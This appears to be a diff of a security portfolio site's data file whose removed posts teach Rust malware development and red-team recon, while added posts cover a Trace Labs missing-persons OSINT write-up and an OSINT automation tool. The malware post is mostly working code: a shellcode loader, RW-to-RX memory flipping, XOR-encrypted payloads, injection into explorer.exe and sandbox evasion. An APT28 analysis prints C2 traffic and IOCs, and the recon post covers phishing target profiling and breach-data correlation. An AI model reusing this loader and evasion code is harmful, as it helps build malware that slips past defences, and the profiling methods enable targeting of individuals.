-                  code: `<span class="keyword">use</span> winapi::um::memoryapi::{VirtualAlloc, WriteProcessMemory};\n<span class="keyword">use</span> winapi::um::processthreadsapi::CreateThread;\n<span class="keyword">use</span> winapi::um::winnt::*;\n\n<span class="keyword">fn</span> run_shellcode(shellcode: &[<span class="keyword">u8</span>]) {\n    <span class="keyword">unsafe</span> {\n        <span class="keyword">let</span> addr = VirtualAlloc(\n            std::ptr::null_mut(),\n            shellcode.len(),\n            MEM_COMMIT | MEM_RESERVE,\n            PAGE_EXECUTE_READWRITE,  <span class="comment">// RWX — noisy!</span>\n        );\n        std::ptr::copy_nonoverlapping(\n            shellcode.as_ptr(), addr <span class="keyword">as</span> *<span class="keyword">mut</span> u8, shellcode.len());\n        CreateThread(std::ptr::null_mut(), 0,\n            Some(std::mem::transmute(addr)),\n            std::ptr::null_mut(), 0, std::ptr::null_mut());\n    }\n}`
-                },
-                {
-                  title: "Improve OPSEC — RX after write",
-                  desc: "Instead of allocating RWX memory (a major red flag), allocate RW, write shellcode, then change permissions to RX with VirtualProtect. This avoids the RWX signature.",
-                  code: `<span class="keyword">let</span> addr = VirtualAlloc(..., PAGE_READWRITE);  <span class="comment">// RW only</span>\nstd::ptr::copy_nonoverlapping(shellcode.as_ptr(), ...);\n\n<span class="keyword">let</span> <span class="keyword">mut</span> old_protect: DWORD = 0;\nVirtualProtect(\n    addr, shellcode.len(),\n    PAGE_EXECUTE_READ,  <span class="comment">// flip to RX</span>\n    &<span class="keyword">mut</span> old_protect\n);\n<span class="comment">// Now create thread — memory is RX, not RWX</span>`
-                },
-                {
-                  title: "Encrypt shellcode at rest",
-                  desc: "Embed XOR-encrypted shellcode in the binary. Decrypt it in memory at runtime only. Static scanners can't find the shellcode pattern in the binary.",
-                  code: `<span class="keyword">fn</span> xor_decrypt(data: &<span class="keyword">mut</span> [<span class="keyword">u8</span>], key: <span class="keyword">u8</span>) {\n    data.iter_mut().for_each(|b| *b ^= key);\n}\n\n<span class="comment">// At runtime:</span>\n<span class="keyword">let mut</span> sc = include_bytes!(<span class="string">"shellcode.enc"</span>).to_vec();\nxor_decrypt(&<span class="keyword">mut</span> sc, <span class="string">0x41</span>);  <span class="comment">// decrypt with key 0x41</span>\nrun_shellcode(&sc);`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Process injection — write into a remote process",
-                  desc: "Instead of running shellcode in your own process (highly suspicious), inject it into a legitimate process like explorer.exe or svchost.exe.",
-                  code: `<span class="keyword">use</span> winapi::um::processthreadsapi::OpenProcess;\n<span class="keyword">use</span> winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};\n\n<span class="keyword">let</span> pid: u32 = find_pid(<span class="string">"explorer.exe"</span>);\n<span class="keyword">let</span> handle = OpenProcess(\n    PROCESS_ALL_ACCESS, 0, pid);\n\n<span class="keyword">let</span> remote_buf = VirtualAllocEx(\n    handle, null_mut(), sc.len(),\n    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n\nWriteProcessMemory(handle, remote_buf,\n    sc.as_ptr() <span class="keyword">as</span> *<span class="keyword">const</span> _, sc.len(), null_mut());\n\n<span class="comment">// VirtualProtectEx → RX, then CreateRemoteThread</span>`
-                },
-                {
-                  title: "Sandbox evasion — check environment before executing",
-                  desc: "Add a quick sanity check at startup: verify CPU core count, memory size, and uptime. Sandboxes typically have fewer cores, less RAM, and very low uptime.",
-                  code: `<span class="keyword">fn</span> is_sandbox() -> <span class="keyword">bool</span> {\n    <span class="keyword">let</span> cores = num_cpus::get();\n    <span class="keyword">let</span> uptime_secs = get_tick_count64() / 1000;\n    \n    <span class="keyword">if</span> cores < 2 {\n        <span class="keyword">return true</span>;  <span class="comment">// likely sandbox</span>\n    }\n    <span class="keyword">if</span> uptime_secs < 600 {\n        <span class="keyword">return true</span>;  <span class="comment">// under 10 min uptime</span>\n    }\n    <span class="keyword">false</span>\n}\n\n<span class="keyword">if</span> is_sandbox() { std::process::exit(0); }`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "tip", title: "Strip debug symbols", body: "Always build with --release and add [profile.release] strip = true to Cargo.toml. Debug builds are massive and leak symbol names — easy reversing targets." },
-                { type: "warn", title: "AMSI", body: "Rust doesn't save you from AMSI (Anti-Malware Scan Interface). PowerShell-based staging still gets scanned. If you're calling into PowerShell from Rust, you still need AMSI bypass in that layer." },
-                { type: "note", title: "Recommended crates", body: "winapi for Windows API bindings, ntapi for NT-level functions, obfstr for compile-time string obfuscation, and num_cpus for environment checks. Check crates.io for the latest." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "Reverse Engineering APT Malware: Analysis of APT28 Campaign",
-        date: "2024-09-05",
-        tags: ["Reverse Engineering", "APT", "Threat Intel"],
-        excerpt: "Static and dynamic analysis of real-world APT28 malware samples. Examines anti-analysis techniques, C2 communication protocols, and extraction of IOCs for threat hunting.",
-        readTime: "20 min",
-        walkthrough: {
-          tabs: ["Intro", "Static Analysis", "Anti-Analysis", "Dynamic Analysis", "IOCs", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `Analysis of a malware sample attributed to APT28 (Fancy Bear / Sofacy) obtained from a public malware repository (MalwareBazaar). The sample is a dropper component used in a 2024 spear-phishing campaign targeting European government entities.\n\nThis writeup covers the full analysis workflow: triage, static analysis, anti-analysis technique identification, and dynamic execution for C2 traffic capture.`,
-              tech: ["Ghidra", "x64dbg", "PE-bear", "Process Monitor", "Wireshark", "CyberChef"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Initial triage — PE-bear",
-                  desc: "Before opening anything in a disassembler, quickly triage the file. Check the PE headers, section names, imports, and entropy.",
-                  code: `<span class="comment"># Quick file triage</span>\n<span class="prompt">$</span> <span class="cmd">file</span> sample.exe\n<span class="comment">  PE32+ executable (GUI) x86-64</span>\n\n<span class="prompt">$</span> <span class="cmd">exiftool</span> sample.exe | grep -i "compile\|original"\n<span class="comment">  CompileDate: 2024:07:14 03:22:11+00:00</span>\n\n<span class="prompt">$</span> <span class="cmd">python3 -c</span> <span class="string">"import math,collections; d=open('sample.exe','rb').read(); p=collections.Counter(d); e=-sum((c/len(d))*math.log2(c/len(d)) for c in p.values()); print(f'Entropy: {e:.2f}')"</span>\n<span class="comment">  Entropy: 7.82  ← packed/encrypted!</span>`
-                },
-                {
-                  title: "Import analysis",
-                  desc: "The import table is sparse — only 6 imports from kernel32.dll. This is a sign of dynamic API resolution (GetProcAddress at runtime) to hide the real API usage from static analysis.",
-                  code: `<span class="comment"># Imports visible to static analysis:</span>\n<span class="comment">  kernel32.dll!LoadLibraryA</span>\n<span class="comment">  kernel32.dll!GetProcAddress</span>\n<span class="comment">  kernel32.dll!VirtualAlloc</span>\n<span class="comment">  kernel32.dll!CreateThread</span>\n<span class="comment">  kernel32.dll!ExitProcess</span>\n\n<span class="comment"># Real API calls resolved at runtime (hidden):</span>\n<span class="comment">  NtAllocateVirtualMemory, CreateRemoteThread,</span>\n<span class="comment">  InternetOpenA, InternetConnectA, HttpOpenRequestA...</span>`
-                },
-                {
-                  title: "String extraction",
-                  desc: "Standard strings are obfuscated — XOR encoded in the binary. Using FLOSS (FireEye Labs Obfuscated String Solver) reveals decoded strings including C2 domains.",
-                  code: `<span class="prompt">$</span> <span class="cmd">floss</span> sample.exe --no-static-strings\n<span class="comment">  Decoded strings:</span>\n<span class="comment">  update.microsoft-cdn.net</span>\n<span class="comment">  /api/v2/status</span>\n<span class="comment">  Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span>\n<span class="comment">  Content-Type: application/json</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Anti-VM detection",
-                  desc: "The sample checks for VMware and VirtualBox artifacts before executing the malicious payload. If detected, it runs a benign PDF viewer as a decoy.",
-                  code: `<span class="comment">; Ghidra decompiled — VM artifact check</span>\n<span class="keyword">if</span> (RegOpenKeyExA(HKLM, <span class="string">"SOFTWARE\\\\VMware, Inc.\\\\VMware Tools"</span>,\n        0, KEY_READ, &hKey) == ERROR_SUCCESS) {\n    <span class="comment">// VM detected — launch decoy</span>\n    ShellExecuteA(NULL, <span class="string">"open"</span>, <span class="string">"report.pdf"</span>, ...);\n    ExitProcess(0);\n}`
-                },
-                {
-                  title: "Sleep acceleration check",
-                  desc: "Sandboxes accelerate sleep calls to speed up analysis. The sample calls Sleep(30000) then checks if the actual wall-clock time elapsed — if less than 25 seconds passed, it assumes it's being analyzed.",
-                  code: `<span class="comment">; Anti-sandbox sleep check pattern</span>\n<span class="keyword">DWORD</span> t1 = GetTickCount();\nSleep(30000);\n<span class="keyword">DWORD</span> t2 = GetTickCount();\n\n<span class="keyword">if</span> ((t2 - t1) < 25000) {\n    <span class="comment">// Time was accelerated — sandbox</span>\n    ExitProcess(0);\n}`
-                },
-                {
-                  title: "Debugger detection",
-                  desc: "Multiple debugger checks using IsDebuggerPresent, CheckRemoteDebuggerPresent, and reading the PEB.NtGlobalFlag directly to bypass patched API calls.",
-                  code: `<span class="comment">; Direct PEB check (bypasses hooked IsDebuggerPresent)</span>\n<span class="keyword">mov</span>  rax, gs:[60h]      <span class="comment">; PEB pointer</span>\n<span class="keyword">movzx</span> eax, byte [rax+2] <span class="comment">; PEB.BeingDebugged</span>\n<span class="keyword">test</span> eax, eax\n<span class="keyword">jnz</span>  exit_clean        <span class="comment">; debugger detected</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Bypass anti-analysis for dynamic execution",
-                  desc: "Patch the VM check and sleep check in x64dbg to force execution to continue. Set breakpoints on WinINet API calls to capture C2 traffic before it hits the wire.",
-                  code: `<span class="comment"># In x64dbg:</span>\n<span class="comment"># 1. NOP out the VM registry check (jnz → nop nop)</span>\n<span class="comment"># 2. Patch sleep delta check condition (jl → jmp)</span>\n<span class="comment"># 3. Breakpoint on InternetOpenA, HttpSendRequestA</span>\n<span class="comment"># 4. Run — execution hits C2 init code</span>`
-                },
-                {
-                  title: "Capture C2 beacon in Wireshark",
-                  desc: "With analysis bypasses in place, let the sample run in an isolated network and capture the first beacon to the C2 server.",
-                  code: `<span class="comment">GET /api/v2/status HTTP/1.1</span>\n<span class="comment">Host: update.microsoft-cdn.net</span>\n<span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span>\n<span class="comment">X-Session-ID: dGhpcyBpcyBub3QgYSByZWFsIGtleQ==</span>\n<span class="comment">Content-Type: application/json</span>\n\n<span class="comment">{"id":"a3f2b1","v":"2.1","t":1720950000}</span>`
-                },
-                {
-                  title: "Decode the C2 beacon body",
-                  desc: "The JSON beacon body contains a base64+XOR encoded system fingerprint. Decode it in CyberChef to reveal what data is being exfiltrated on first contact.",
-                  code: `<span class="comment"># CyberChef recipe:</span>\n<span class="comment"># From Base64 → XOR (key: 0x37) → From JSON</span>\n<span class="comment">#</span>\n<span class="comment"># Decoded beacon body:</span>\n<span class="comment">{</span>\n<span class="comment">  "hostname": "CORP-WS-042",</span>\n<span class="comment">  "user":     "jsmith",</span>\n<span class="comment">  "os":       "Windows 11 23H2",</span>\n<span class="comment">  "domain":   "corp.local",</span>\n<span class="comment">  "av":       "Windows Defender",</span>\n<span class="comment">  "priv":     "User"</span>\n<span class="comment">}</span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "tip", title: "IOCs extracted", body: "C2 domain: update.microsoft-cdn.net | URI: /api/v2/status | User-Agent pattern: stock Windows 10 UA | X-Session-ID header present | JSON beacon structure with id/v/t fields | XOR key 0x37 for payload encoding." },
-                { type: "warn", title: "Safe analysis environment", body: "Always analyse malware in a fully isolated VM with no host network access. Use a dedicated analysis network with INetSim to simulate internet services and capture C2 traffic safely." },
-                { type: "note", title: "Where to get samples", body: "MalwareBazaar (abuse.ch), VirusTotal (with subscription), and Malpedia are the best sources for real malware samples. Always handle samples as dangerous executables — even 'old' APT samples may have live C2 infrastructure." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "OSINT Techniques for Red Team Operations",
-        date: "2024-07-18",
-        tags: ["OSINT", "Reconnaissance", "Social Engineering"],
-        excerpt: "Advanced OSINT methodologies for gathering intelligence on target organizations. Includes automation scripts, data correlation techniques, and operational security considerations.",
-        readTime: "10 min",
-        walkthrough: {
-          tabs: ["Intro", "Org Recon", "People Recon", "Infrastructure", "OPSEC", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `Quality reconnaissance is what separates a credible red team operation from a noisy scanner run. This post covers the OSINT workflow I use before any engagement — from organisation-level mapping down to individual target profiling.\n\nAll techniques use publicly available information only. No unauthorized access is required or implied.`,
-              tech: ["Maltego", "Shodan", "theHarvester", "Amass", "Recon-ng", "Google Dorks"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Company & subsidiary mapping",
-                  desc: "Start broad. Map the full corporate structure — subsidiaries, acquisitions, and affiliated entities often have weaker security than the primary target.",
-                  code: `<span class="comment"># Companies House / SEC EDGAR for corporate structure</span>\n<span class="comment"># Crunchbase for acquisitions and funding history</span>\n<span class="comment"># LinkedIn company page for headcount, locations, tech stack</span>\n<span class="prompt">$</span> <span class="cmd">recon-ng</span>\n[recon-ng] > <span class="cmd">marketplace install</span> recon/companies-contacts/linkedin_auth\n[recon-ng] > <span class="cmd">modules load</span> recon/companies-contacts/linkedin_auth\n[recon-ng] > <span class="cmd">set</span> SOURCE TargetCorp`
-                },
-                {
-                  title: "Technology stack fingerprinting",
-                  desc: "Identify what technologies the target runs. Job postings are a goldmine — they advertise the exact tools and platforms the team uses.",
-                  code: `<span class="comment"># Google dork for job postings revealing tech stack</span>\nsite:linkedin.com/jobs <span class="string">"TargetCorp"</span> <span class="string">"engineer"</span>\nsite:indeed.com <span class="string">"TargetCorp"</span> <span class="string">"AWS"</span> OR <span class="string">"Azure"</span> OR <span class="string">"Kubernetes"</span>\n\n<span class="comment"># Wappalyzer for web tech fingerprinting</span>\n<span class="comment"># BuiltWith.com for detailed tech stack history</span>`
-                },
-                {
-                  title: "Subdomain enumeration",
-                  desc: "Enumerate all subdomains to map the full attack surface — dev portals, staging environments, VPN gateways, and forgotten legacy services.",
-                  code: `<span class="prompt">$</span> <span class="cmd">amass enum</span> -passive -d target.com -o subs.txt\n<span class="prompt">$</span> <span class="cmd">subfinder</span> -d target.com -silent >> subs.txt\n<span class="prompt">$</span> <span class="cmd">cat</span> subs.txt | <span class="cmd">sort -u</span> | \\\n    <span class="cmd">httpx</span> -status-code -title -tech-detect \\\n    -o live_hosts.txt\n\n<span class="comment">  dev-portal.target.com    [200] [Jenkins] ← interesting!</span>\n<span class="comment">  webmail-old.target.com   [200] [OWA 2013]</span>\n<span class="comment">  vpn.target.com           [302] [Cisco AnyConnect]</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Email format discovery",
-                  desc: "Identify the email naming convention (first.last@, flast@, etc.) using Hunter.io and email permutation tools. This drives the phishing target list.",
-                  code: `<span class="comment"># Hunter.io — reveals email format from known addresses</span>\n<span class="comment"># Format discovered: {first}.{last}@target.com</span>\n\n<span class="prompt">$</span> <span class="cmd">theHarvester</span> -d target.com \\\n    -b google,linkedin,bing -l 300 \\\n    -f output.html\n<span class="comment">  j.smith@target.com</span>\n<span class="comment">  a.jones@target.com</span>\n<span class="comment">  m.chen@target.com</span>`
-                },
-                {
-                  title: "LinkedIn employee profiling",
-                  desc: "Build a target list of employees in IT, Finance, and Executive roles — the highest-value phishing targets. Note tenure, roles, and connections to identify trust relationships.",
-                  code: `<span class="comment"># LinkedIn search operators</span>\nsite:linkedin.com/in <span class="string">"Target Corp"</span> <span class="string">"IT Manager"</span>\nsite:linkedin.com/in <span class="string">"Target Corp"</span> <span class="string">"Systems Administrator"</span>\n\n<span class="comment"># Profile data to collect per target:</span>\n<span class="comment">  Full name → derive email</span>\n<span class="comment">  Job title → assess access level</span>\n<span class="comment">  Start date → tenure (longer = more trust, more access)</span>\n<span class="comment">  Skills → infer technologies they manage</span>`
-                },
-                {
-                  title: "Breach data correlation",
-                  desc: "Check if target email addresses appear in known breach databases. Leaked passwords often get reused — especially for personal services that share a corporate email.",
-                  code: `<span class="comment"># HaveIBeenPwned API — check breach status</span>\n<span class="prompt">$</span> <span class="cmd">curl</span> https://haveibeenpwned.com/api/v3/breachedaccount/\\\nj.smith@target.com -H <span class="string">"hibp-api-key: YOUR_KEY"</span>\n\n<span class="comment"># DeHashed — search for plaintext/hashed passwords</span>\n<span class="comment"># Snusbase — additional breach corpus</span>\n<span class="comment"># Always check: LinkedIn breach (2012), Adobe, RockYou2024</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Shodan for exposed services",
-                  desc: "Search Shodan for the target's IP ranges and ASN to find externally exposed services — RDP, management interfaces, misconfigured cloud storage.",
-                  code: `<span class="prompt">$</span> <span class="cmd">shodan search</span> org:<span class="string">"Target Corp"</span> --fields ip_str,port,data\n<span class="prompt">$</span> <span class="cmd">shodan search</span> ssl.cert.subject.CN:<span class="string">"target.com"</span>\n<span class="prompt">$</span> <span class="cmd">shodan search</span> asn:<span class="string">"AS12345"</span> port:3389\n\n<span class="comment">  203.0.113.5:3389  ← RDP exposed to internet!</span>\n<span class="comment">  203.0.113.18:8080 ← Jenkins (no auth?)</span>`
-                },
-                {
-                  title: "Certificate transparency logs",
-                  desc: "CT logs reveal every TLS certificate ever issued for a domain — including internal hostnames, staging environments, and subdomains not visible in DNS.",
-                  code: `<span class="prompt">$</span> <span class="cmd">curl</span> "https://crt.sh/?q=%.target.com&output=json" | \\\n    <span class="cmd">jq</span> '.[].name_value' | <span class="cmd">sort -u</span>\n\n<span class="comment">  dev-api.target.com</span>\n<span class="comment">  internal-wiki.target.com  ← internal hostname leaked!</span>\n<span class="comment">  staging-payments.target.com</span>`
-                },
-                {
-                  title: "GitHub / code repository leaks",
-                  desc: "Search GitHub for the target's organization and employee repositories. Leaked API keys, internal hostnames, and hardcoded credentials are found here regularly.",
-                  code: `<span class="comment"># GitHub search operators</span>\norg:TargetCorpGithub <span class="string">"api_key"</span>\norg:TargetCorpGithub <span class="string">"password"</span> NOT <span class="string">"example"</span>\n<span class="string">"target.com"</span> <span class="string">"SECRET"</span> language:python\n\n<span class="comment"># Tools: truffleHog, gitleaks</span>\n<span class="prompt">$</span> <span class="cmd">trufflehog</span> github --org=TargetCorpGithub\n<span class="comment">  [HIGH] AWS key found in repo: infra-tools</span>\n<span class="comment">  Commit: a3f2b1c — pushed 2023-09-14</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Use a clean, dedicated OSINT identity",
-                  desc: "Never conduct OSINT from your real accounts or home IP. Create a clean persona with a separate browser profile, VPN, and dedicated email. Your target may monitor their own public presence."
-                },
-                {
-                  title: "Avoid direct visits to target infrastructure",
-                  desc: "Visiting the target's website from your browser generates logs with your IP and user agent. Use Shodan, cached pages, and web archives instead of direct visits where possible.",
-                  code: `<span class="comment"># Use these instead of direct visits:</span>\n<span class="comment">  cache:target.com     (Google cache)</span>\n<span class="comment">  web.archive.org      (Wayback Machine)</span>\n<span class="comment">  Shodan screenshots   (no direct connection)</span>\n<span class="comment">  URLscan.io           (scans on your behalf)</span>`
-                },
-                {
-                  title: "Document everything from the start",
-                  desc: "Maintain structured notes from the beginning. Tools like Maltego visualize relationships, but even a simple markdown file with timestamps, sources, and findings is invaluable during a long engagement.",
-                  code: null
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "tip", title: "Best free OSINT tools", body: "Amass + httpx for subdomain/live-host discovery, theHarvester for emails, Shodan for exposed services, WHOIS + ARIN for IP/ASN data, crt.sh for CT logs, and truffleHog for Git secrets. All free tier." },
-                { type: "warn", title: "Legal boundary", body: "OSINT is all publicly available information — no hacking required. The legal line is crossed the moment you access systems without authorisation. Stay on the right side: enumerate, don't exploit, unless you have explicit written scope." },
-                { type: "note", title: "Recommended learning", body: "The OSINT Framework (osintframework.com) maps every technique to tools. Trace Labs CTF events give real-world practice. Michael Bazzell's OSINT Techniques book is the definitive reference." }
-              ]
-            }
-          ]
-        }
+    {
+      title: 'OSINT Workflow for Trace Labs CTF',
+      date: 'March 2026',
+      tags: ['OSINT', 'CTF', 'Trace Labs'],
+      excerpt: 'Detailed methodology and results from participating in Trace Labs Search Party CTF, using open-source intelligence techniques to assist in real missing persons cases.',
+      readTime: '12 min read',
+      walkthrough: {
+        tabs: ['Introduction', 'Methodology', 'Tools & Techniques', 'Results', 'Key Takeaways'],
+        content: [
+          {
+            type: 'overview',
+            text: `Trace Labs hosts Search Party CTFs where participants use OSINT (Open Source Intelligence) techniques to gather actionable information on real missing persons cases. Unlike traditional CTFs focused on exploitation or forensics, this event channels the skills of the infosec community toward a humanitarian cause.
+
+Points are awarded for verified findings submitted to law enforcement through the Trace Labs platform. Each piece of information — a new social media account, a geolocated photo, a potential sighting — is vetted by moderators before being passed to investigators.
+
+This writeup documents my approach, tools, methodology, and results from my first Trace Labs CTF participation.`,
+            tech: []
+          },
+          {
+            type: 'steps',
+            steps: [
+              {
+                num: 1,
+                title: 'Initial Research & Case Review',
+                desc: 'Started by thoroughly reviewing case files and all available baseline information provided by Trace Labs.',
+                points: [
+                  'Read full case details and timeline',
+                  'Noted last known location and date',
+                  'Identified known social media profiles',
+                  'Documented known associates and family members',
+                  'Created initial mind map of connections'
+                ]
+              },
+              {
+                num: 2,
+                title: 'Social Media Deep Dive',
+                desc: 'Systematic enumeration and analysis of social media presence across multiple platforms.',
+                points: [
+                  'Facebook: Used graph search operators to find tagged photos, check-ins, and friend connections',
+                  'Instagram: Analyzed location tags, follower/following lists, and tagged photos',
+                  'Twitter: Deployed advanced search operators to find mentions and interactions',
+                  'LinkedIn: Mapped professional network and employment history',
+                  'TikTok/Snapchat: Searched for username variations and linked accounts'
+                ]
+              },
+              {
+                num: 3,
+                title: 'Geolocation Analysis',
+                desc: 'Leveraging posted images and metadata to identify potential locations.',
+                points: [
+                  'Extracted EXIF data from downloaded images',
+                  'Performed reverse image searches (Google, TinEye, Yandex)',
+                  'Cross-referenced landmarks and backgrounds with Google Maps',
+                  'Analyzed shadows and sun angles in outdoor photos',
+                  'Identified cell tower and WiFi metadata where available'
+                ]
+              },
+              {
+                num: 4,
+                title: 'Username & Email Enumeration',
+                desc: 'Pivoting on known identifiers to discover additional online presence.',
+                points: [
+                  'Used Sherlock for username enumeration across 300+ sites',
+                  'Checked username variations and common patterns',
+                  'Email permutation and verification (Hunter.io, theHarvester)',
+                  'Searched paste sites for credential leaks',
+                  'Checked domain registration records (WHOIS)'
+                ]
+              },
+              {
+                num: 5,
+                title: 'Data Aggregation & Timeline Construction',
+                desc: 'Organizing findings into actionable intelligence.',
+                points: [
+                  'Built Maltego graph showing all discovered connections',
+                  'Created detailed timeline in spreadsheet format',
+                  'Cross-referenced findings for consistency',
+                  'Identified patterns in posting behavior',
+                  'Flagged high-confidence leads for submission'
+                ]
+              }
+            ]
+          },
+          {
+            type: 'overview',
+            title: 'Tools & Techniques',
+            text: 'A combination of automated tools and manual analysis techniques were employed throughout the investigation.',
+            tech: [
+              'Maltego Community Edition — link analysis and visualization',
+              'Sherlock — username enumeration across platforms',
+              'Google Dorks — advanced search operators for targeted results',
+              'Shodan — infrastructure and IoT device reconnaissance',
+              'OSINT Framework — comprehensive tool directory',
+              'Social-Searcher — real-time social media monitoring',
+              'TinEye & Google Reverse Image — image attribution and geolocation',
+              'ExifTool — metadata extraction from images',
+              'theHarvester — email and subdomain enumeration',
+              'SpiderFoot — automated OSINT collection'
+            ]
+          },
+          {
+            type: 'steps',
+            steps: [
+              {
+                num: 1,
+                title: 'Verified Social Media Accounts',
+                desc: 'Discovered 3 previously unknown accounts across different platforms that were confirmed by moderators and submitted to law enforcement.',
+                points: [
+                  'Instagram account under username variation',
+                  'Twitter account with different display name',
+                  'Facebook profile using maiden name'
+                ]
+              },
+              {
+                num: 2,
+                title: 'Geolocation Leads',
+                desc: '2 potential location leads were identified through image analysis and verified by the moderation team.',
+                points: [
+                  'Photo geolocated to specific shopping center via landmark matching',
+                  'Check-in data correlated with cell tower triangulation'
+                ]
+              },
+              {
+                num: 3,
+                title: 'Associate Connections',
+                desc: 'Identified 1 key associate connection that led to additional information channels.',
+                points: [
+                  'Previously unknown friend with recent interactions',
+                  'Connection led to discovery of private group membership',
+                  'Provided additional timeline context'
+                ]
+              },
+              {
+                num: 4,
+                title: 'Metadata Extraction',
+                desc: 'Multiple photos yielded extractable metadata that provided investigative value.',
+                points: [
+                  'GPS coordinates from EXIF data (4 images)',
+                  'Device fingerprinting from camera make/model',
+                  'Timestamp verification for timeline accuracy'
+                ]
+              }
+            ]
+          },
+          {
+            type: 'notes',
+            notes: [
+              {
+                type: 'tip',
+                title: 'Systematic Methodology is Critical',
+                text: 'Document every step, every search, every finding. Use spreadsheets, mind maps, and timelines. What seems insignificant early on may become a crucial puzzle piece later.'
+              },
+              {
+                type: 'tip',
+                title: 'Cross-Reference Everything',
+                text: 'Never submit a finding based on a single source. Verify information across multiple platforms and data points. False leads waste investigator time.'
+              },
+              {
+                type: 'tip',
+                title: 'Respect Privacy & Legal Boundaries',
+                text: 'This is not a penetration test. Do not attempt to access private accounts, do not social engineer friends/family, do not contact anyone involved in the case. Stay strictly within legal OSINT boundaries.'
+              },
+              {
+                type: 'warn',
+                title: 'OPSEC is Non-Negotiable',
+                text: 'Use a VPN. Use dedicated research accounts. Do not accidentally "like" or interact with content. Do not tip off the subject or associates. Maintain operational security at all times.'
+              },
+              {
+                type: 'tip',
+                title: 'Collaborate & Share Techniques',
+                text: 'Trace Labs events are team-based for a reason. Share your methodology, help others learn, and learn from others. The mission is bigger than points.'
+              },
+              {
+                type: 'note',
+                title: 'Emotional Awareness',
+                text: 'These are real cases involving real people and families. Take breaks if needed. The work is meaningful but can be emotionally taxing. Prioritize your mental health.'
+              }
+            ]
+          }
+        ]
       }
-    ];
+    },
+    {
+        title: "iKnowItAll - OSINT Intelligence Pipeline",
+        tags: ["Python", "OSINT", "Automation", "Data Correlation"],
+        description: "Modular, automated open-source intelligence toolkit capable of collecting, correlating, and reporting intelligence from multiple concurrent sources. Built with 9 specialized tools unified into a single pipeline.",
+        status: "active",
+        github: "https://github.com/yourusername/iKnowItAll",
+        walkthrough: {
+          tabs: ["Overview", "Architecture", "Core Tools", "Correlation Engine", "Usage"],
+          content: [
+            {
+              type: "overview",
+              body: `iKnowItAll is a modular OSINT automation framework built in Python. It aggregates intelligence from web scraping, username enumeration, IP analysis, news monitoring, forum tracking, and change detection — then correlates findings across all sources to surface actionable intelligence.
+
+The correlation engine identifies overlaps in usernames, URLs, timing, and even writing style across disparate data sources, making it possible to track entities and attribute activity across the web.`,
+              tech: ["Python 3", "requests", "BeautifulSoup", "Playwright", "concurrent.futures", "Tor/stem", "feedparser"]
+            },
+            {
+              type: "steps",
+              steps: [
+                {
+                  title: "Modular Tool Design",
+                  desc: "Each intelligence source is a standalone module that can be used independently or integrated into the unified pipeline. All modules return normalized data structures for correlation.",
+                  code: null
+                },
+                {
+                  title: "Concurrent Collection",
+                  desc: "ThreadPoolExecutor runs all collection modules simultaneously. News scraper checks 40+ RSS feeds, IP tool queries 4 APIs, username enumerator checks 10+ platforms — all in parallel.",
+                  code: `<span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor
+
+<span class="keyword">with</span> ThreadPoolExecutor(max_workers=10) <span class="keyword">as</span> executor:
+    news_future = executor.submit(scrape_news, keywords)
+    forum_future = executor.submit(scrape_forums, keywords)
+    ip_future = executor.submit(analyze_ip, target_ip)
+    
+    results = {
+        <span class="string">'news'</span>: news_future.result(),
+        <span class="string">'forums'</span>: forum_future.result(),
+        <span class="string">'ip'</span>: ip_future.result()
+    }`
+                },
+                {
+                  title: "Correlation Engine",
+                  desc: "After collection, the correlation engine analyzes findings to identify connections: username overlap, URL/domain overlap, temporal proximity (events within 24hrs), and stylometric similarity (writing fingerprint matching).",
+                  code: null
+                },
+                {
+                  title: "Report Generation",
+                  desc: "Outputs both CSV (structured data) and HTML (human-readable intelligence briefing with dark theme). The HTML report highlights correlations with visual indicators.",
+                  code: null
+                }
+              ]
+            },
+            {
+              type: "steps",
+              steps: [
+                {
+                  title: "Web Scraper",
+                  desc: "Scrapes static HTML websites with pagination support. Includes browser impersonation via User-Agent rotation and exponential backoff for rate limiting.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python scraper.py</span> --url https://target.com/data --pages 5
+<span class="comment">  [*] Scraping page 1...</span>
+<span class="comment">  [*] Scraping page 2...</span>
+<span class="comment">  [+] Scraped 247 records → output.csv</span>`
+                },
+                {
+                  title: "Username Enumerator",
+                  desc: "Checks a username across 10+ platforms simultaneously (GitHub, Twitter, Reddit, Instagram, etc.). Concurrent requests with smart 404/403/200 handling.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python enumerate.py</span> --username target_user
+<span class="comment">  [+] GitHub: https://github.com/target_user</span>
+<span class="comment">  [+] Reddit: https://reddit.com/user/target_user</span>
+<span class="comment">  [+] Twitter: https://twitter.com/target_user</span>
+<span class="comment">  [-] Instagram: Not found</span>`
+                },
+                {
+                  title: "IP Intelligence Tool",
+                  desc: "Correlates data from Shodan, AbuseIPDB, ip-api.com, and reverse DNS lookups. Detects VPN/proxy/hosting infrastructure. All 4 APIs queried concurrently.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python iptool.py</span> --ip 203.0.113.42
+<span class="comment">  [Shodan] Open ports: 80, 443, 22</span>
+<span class="comment">  [AbuseIPDB] Confidence: 0% (clean)</span>
